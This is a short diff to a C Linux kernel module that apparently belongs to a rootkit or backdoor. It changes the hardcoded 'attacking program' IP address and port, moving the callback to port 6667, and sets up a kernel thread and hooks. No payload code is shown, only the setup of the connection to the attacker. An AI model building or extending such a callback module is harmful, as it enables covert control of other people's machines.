@@ -4,11 +4,13 @@
 #include "hook.h"
 #include "network.h"
 
-static char *ip = "192.168.122.34";
-static int port = 9996;
+static char *ip = "192.168.1.53";
+static int port = 6667;
 static struct task_struct *thread = NULL;
 
 module_param(ip, charp, 0660);
+/* module_param(ip, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH |
+ * S_IWOTH); */
 module_param(port, int, 0660);
 MODULE_PARM_DESC(ip, "IP address of the attacking program");
 MODULE_PARM_DESC(port, "Port number of the attacking program");
